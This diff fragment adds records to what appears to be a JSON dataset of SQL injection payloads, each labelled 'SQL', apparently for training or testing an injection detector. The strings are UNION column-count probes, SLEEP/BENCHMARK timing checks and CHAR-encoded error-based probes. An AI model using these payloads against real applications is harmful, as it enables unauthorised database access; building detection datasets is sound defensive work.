+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT NULL#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT NULL",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--",
+        "category": "SQL"
+    },
+    {
